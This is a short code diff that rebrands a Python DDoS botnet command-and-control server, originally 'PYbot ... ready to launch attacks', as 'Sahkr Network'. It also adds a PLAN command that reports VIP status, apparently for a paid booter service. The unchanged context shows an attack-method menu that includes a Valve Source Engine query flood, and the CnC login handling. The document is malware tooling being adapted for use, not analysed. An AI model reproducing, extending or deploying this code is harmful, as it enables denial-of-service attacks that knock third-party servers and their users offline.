@@ -10,8 +10,8 @@ ansi_clear = '\033[2J\033[H'
 
 banner = '''
                     *********************************
-                    *         PYbot by wodx         *
-                    *    ready to launch attacks    *
+                    |         Sahkr Network         |
+                    |     Copyright ©️ 2022@2022     |
                     *********************************
         '''
 
@@ -110,6 +110,7 @@ def command_line(client):
                 send(client, 'HELP: Shows list of commands')
                 send(client, 'METHODS: Shows list of attack methods')
                 send(client, 'CLEAR: Clears the screen')
+                send(client, 'PLAN: Shows plan information')
                 send(client, 'LOGOUT: Disconnects from CnC server')
                 send(client, '')
 
@@ -130,6 +131,10 @@ def command_line(client):
                 send(client, 'Goodbye :-)')
                 time.sleep(1)
                 break
+    
+            elif command == 'PLAN':
+                send(client, 'VIP: TRUE')
+                
             
             # Valve Source Engine query flood
             elif command == '.VSE':
@@ -245,7 +250,7 @@ def command_line(client):
     client.close()
 
 def handle_client(client, address):
-    send(client, f'\33]0;PYbot | Login\a', False)
+    send(client, f'\33]0;Sahkr | Login\a', False)
 
     # username login
     while 1:
